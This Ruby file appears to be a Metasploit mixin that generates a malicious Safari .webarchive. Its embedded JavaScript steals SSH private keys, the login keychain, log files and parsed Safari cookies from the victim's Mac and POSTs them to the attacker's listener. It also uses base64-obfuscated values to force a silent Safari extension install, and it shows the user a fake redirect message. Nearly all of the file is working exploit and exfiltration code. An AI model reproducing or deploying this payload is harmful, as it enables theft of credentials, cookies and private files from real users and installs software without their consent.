#
# The WebArchive mixin provides methods for generating a Safari .webarchive file
# that performs a variety of malicious tasks: stealing files, cookies, and silently
# installing extensions from extensions.apple.com.
#
module Msf
module Format
module Webarchive

  def initialize(info={})
    super
    register_options([
      OptString.new("URIPATH", [false, 'The URI to use for this exploit (default is random)']),
      OptString.new('FILENAME', [ true, 'The file name',  'msf.webarchive']),
      OptString.new('GRABPATH', [false, "The URI to receive the UXSS'ed data", 'grab']),
      OptString.new('DOWNLOAD_PATH', [ true, 'The path to download the webarchive', '/msf.webarchive']),
      OptString.new('FILE_URLS', [false, 'Additional file:// URLs to steal. $USER will be resolved to the username.', '']),
      OptBool.new('STEAL_COOKIES', [true, "Enable cookie stealing", true]),
      OptBool.new('STEAL_FILES', [true, "Enable local file stealing", true]),
      OptBool.new('INSTALL_EXTENSION', [true, "Silently install a Safari extensions (requires click)", false]),
      OptString.new('EXTENSION_URL', [false, "HTTP URL of a Safari extension to install", "https://data.getadblock.com/safari/AdBlock.safariextz"]),
      OptString.new('EXTENSION_ID', [false, "The ID of the Safari extension to install", "com.betafish.adblockforsafari-UAMUU4S2D9"])
    ], self.class)
  end

  ### ASSEMBLE THE WEBARCHIVE XML ###

  # @return [String] contents of webarchive as an XML document
  def webarchive_xml
    return @xml if not @xml.nil? # only compute xml once
    @xml = webarchive_header
    @xml << webarchive_footer
    @xml
  end

  # @return [String] the first chunk of the webarchive file, containing the WebMainResource
  def webarchive_header
    %Q|
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
        "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
      <plist version="1.0">
      <dict>
        <key>WebMainResource</key>
        <dict>
          <key>WebResourceData</key>
          <data>
            #{Rex::Text.encode_base64(iframes_container_html)}</data>
          <key>WebResourceFrameName</key>
          <string></string>
          <key>WebResourceMIMEType</key>
          <string>text/html</string>
          <key>WebResourceTextEncodingName</key>
          <string>UTF-8</string>
          <key>WebResourceURL</key>
          <string>file:///</string>
        </dict>
        <key>WebSubframeArchives</key>
        <array>
    |
  end

  # @return [String] the closing chunk of the webarchive XML code
  def webarchive_footer
    %Q|
        </array>
      </dict>
      </plist>
    |
  end

  #### JS/HTML CODE ####

  # Wraps the result of the block in an HTML5 document and body
  def wrap_with_doc(&blk)
    %Q|
      <!doctype html>
      <html>
        <body>
          #{yield}
        </body>
      </html>
    |
  end

  # Wraps the result of the block with <script> tags
  def wrap_with_script(&blk)
    "<script>#{yield}</script>"
  end

  # @return [String] mark up for embedding the iframes for each URL in a place that is
  #   invisible to the user
  def iframes_container_html
    hidden_style = "position:fixed; left:-600px; top:-600px;"
    wrap_with_doc do
      communication_js + injected_js_helpers + steal_files + install_extension + message
    end
  end

  # @return [String] javascript code, wrapped in script tags, that is inserted into the
  #   WebMainResource (parent) frame so that child frames can communicate "up" to the parent
  #   and send data out to the listener
  def communication_js
    wrap_with_script do
      %Q|
        window.addEventListener('message', function(event){
          var x = new XMLHttpRequest;
          x.open('POST', '#{backend_url}#{collect_data_uri}', true);
          x.send(event.data);
        });
      |
    end
  end

  def apple_extension_url
    'https://extensions.apple.com'
  end

  def install_extension
    return '' unless datastore['INSTALL_EXTENSION']
    raise "EXTENSION_URL datastore option missing" unless datastore['EXTENSION_URL'].present?
    raise "EXTENSION_ID datastore option missing" unless datastore['EXTENSION_ID'].present?
    wrap_with_script do
      %Q|
      var extURL = atob('#{Rex::Text.encode_base64(datastore['EXTENSION_URL'])}');
      var extID = atob('#{Rex::Text.encode_base64(datastore['EXTENSION_ID'])}');

      window.onclick = function(){
        x = window.open('#{apple_extension_url}', 'x');

        function go(){
          window.focus();
          window.open('javascript:safari&&(safari.installExtension\|\|(window.top.location.href.match(/extensions/)&&window.top.location.reload(false)))&&(safari.installExtension("'+extID+'", "'+extURL+'"), window.close());', 'x')
        }
        setInterval(go, 400);
      };

      |
    end
  end

  # @return [String] javascript code, wrapped in a script tag, that steals local files
  #   and sends them back to the listener. This code is executed in the WebMainResource (parent)
  #   frame, which runs in the file:// protocol
  def steal_files
    return '' unless should_steal_files?
    urls_str = (datastore['FILE_URLS'].split(/\s+/)).reject { |s| !s.include?('$USER') }.join(' ')
    wrap_with_script do
      %Q|
        var filesStr = "#{urls_str}";
        var files = filesStr.trim().split(/\s+/);
        function stealFile(url) {
          var req = new XMLHttpRequest();
          var sent = false;
          req.open('GET', url, true);
          req.onreadystatechange = function() {
            if (!sent && req.responseText && req.responseText.length > 0) {
              sendData(url, req.responseText);
              sent = true;
            }
          };
          req.send(null);
        };
        files.forEach(stealFile);

      | + steal_default_files
    end
  end

  def default_files
    ('file:///Users/$USER/.ssh/id_rsa file:///Users/$USER/.ssh/id_rsa.pub '+
      'file:///Users/$USER/Library/Keychains/login.keychain ' +
      (datastore['FILE_URLS'].split(/\s+/)).select { |s| s.include?('$USER') }.join(' ')).strip
  end

  def steal_default_files
    %Q|

      try {

function xhr(url, cb, responseType) {
  var x = new XMLHttpRequest;
  x.onload = function() { cb(x) }
  x.open('GET', url);
  if (responseType) x.responseType = responseType;
  x.send();
}

var files = ['/var/log/monthly.out', '/var/log/appstore.log', '/var/log/install.log'];
var done = 0;
var _u = {};

var cookies = [];
files.forEach(function(f) {
  xhr(f, function(x) {
    var m;
    var users = [];
    var pattern = /\\/Users\\/([^\\s^\\/^"]+)/g;
    while ((m = pattern.exec(x.responseText)) !== null) {
      if(!_u[m[1]]) { users.push(m[1]); }
      _u[m[1]] = 1;
    }

    if (users.length) { next(users); }
  });
});

var id=0;
function next(users) {
  // now lets steal all the data we can!
  sendData('usernames'+id, users);
  id++;
  users.forEach(function(user) {

    if (#{datastore['STEAL_COOKIES']}) {
      xhr('file:///Users/'+encodeURIComponent(user)+'/Library/Cookies/Cookies.binarycookies', function(x) {
        parseBinaryFile(x.response);
      }, 'arraybuffer');
    }

    if (#{datastore['STEAL_FILES']}) {
      var files = '#{Rex::Text.encode_base64(default_files)}';
      atob(files).split(/\\s+/).forEach(function(file) {
        file = file.replace('$USER', encodeURIComponent(user));
        xhr(file, function(x) {
          sendData(file.replace('file://', ''), x.responseText);
        });
      });
    }

  });
}

function parseBinaryFile(buffer) {
  var data = new DataView(buffer);

  // check for MAGIC 'cook' in big endian
  if (data.getUint32(0, false) != 1668247403)
    throw new Error('Invalid magic at top of cookie file.')

  // big endian length in next 4 bytes
  var numPages = data.getUint32(4, false);
  var pageSizes = [], cursor = 8;
  for (var i = 0; i < numPages; i++) {
    pageSizes.push(data.getUint32(cursor, false));
    cursor += 4;
  }

  pageSizes.forEach(function(size) {
    parsePage(buffer.slice(cursor, cursor + size));
    cursor += size;
  });

  reportStolenCookies();
}

function parsePage(buffer) {
  var data = new DataView(buffer);
  if (data.getUint32(0, false) != 256) {
    return; // invalid magic in page header
  }

  var numCookies = data.getUint32(4, true);
  var offsets = [];
  for (var i = 0; i < numCookies; i++) {
    offsets.push(data.getUint32(8+i*4, true));
  }

  offsets.forEach(function(offset, idx) {
    var next = offsets[idx+1] \|\| buffer.byteLength - 4;
    try{parseCookie(buffer.slice(offset, next));}catch(e){};
  });
}

function read(data, offset) {
  var str = '', c = null;
  try {
    while ((c = data.getUint8(offset++)) != 0) {
      str += String.fromCharCode(c);
    }
  } catch(e) {};
  return str;
}

function parseCookie(buffer) {
  var data = new DataView(buffer);
  var size = data.getUint32(0, true);
  var flags = data.getUint32(8, true);
  var urlOffset = data.getUint32(16, true);
  var nameOffset = data.getUint32(20, true);
  var pathOffset = data.getUint32(24, true);
  var valueOffset = data.getUint32(28, true);

  var result = {
    value: read(data, valueOffset),
    path: read(data, pathOffset),
    url: read(data, urlOffset),
    name: read(data, nameOffset),
    isSecure: flags & 1,
    httpOnly: flags & 4
  };

  cookies.push(result);
}

function reportStolenCookies() {
  if (cookies.length > 0) {
    sendData('cookieDump', cookies);
  }
}

} catch (e) { console.log('ERROR: '+e.message); }

    |
  end

  # @return [String] javascript code, wrapped in script tag, that adds a helper function
  #   called "sendData()" that passes the arguments up to the parent frame, where it is
  #   sent out to the listener
  def injected_js_helpers
    wrap_with_script do
      %Q|
        window.sendData = function(key, val) {
          var data = {};
          data[key] = val;
          window.top.postMessage(JSON.stringify(data), "*")
        };
      |
    end
  end

  ### HELPERS ###

  # @return [String] the path to send data back to
  def collect_data_uri
    '/' + (datastore["URIPATH"] || '').chomp('/').gsub(/^\//, '') + '/'+datastore["GRABPATH"]
  end

  # @return [String] formatted http/https URL of the listener
  def backend_url
    proto = (datastore["SSL"] ? "https" : "http")
    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
    port_str = (datastore['HTTPPORT'].to_i == 80) ? '' : ":#{datastore['HTTPPORT']}"
    "#{proto}://#{myhost}#{port_str}"
  end

  # @return [String] URL that serves the malicious webarchive
  def webarchive_download_url
    datastore["DOWNLOAD_PATH"]
  end

  # @return [String] HTML content that is rendered in the <body> of the webarchive.
  def message
    "<p>You are being redirected. <a href='#'>Click here if nothing happens</a>.</p>"
  end

  # @return [Array<String>] of URLs provided by the user
  def urls
    (datastore['URLS'] || '').split(/\s+/)
  end

  # @param [String] input the unencoded string
  # @return [String] input with dangerous chars replaced with xml entities
  def escape_xml(input)
    input.to_s.gsub("&", "&amp;").gsub("<", "&lt;")
              .gsub(">", "&gt;").gsub("'", "&apos;")
              .gsub("\"", "&quot;")
  end

  def should_steal_files?
    datastore['STEAL_FILES']
  end

end
end
end
